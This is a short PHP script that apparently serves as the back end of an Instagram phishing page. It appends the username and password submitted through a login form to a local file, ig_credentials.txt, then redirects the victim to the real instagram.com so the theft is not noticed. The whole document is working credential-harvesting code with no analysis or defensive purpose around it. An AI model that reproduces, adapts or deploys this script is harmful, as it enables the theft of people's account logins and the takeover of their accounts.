<?php

file_put_contents("ig_credentials.txt", "Profile: " . $_POST['username'] . " Password: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
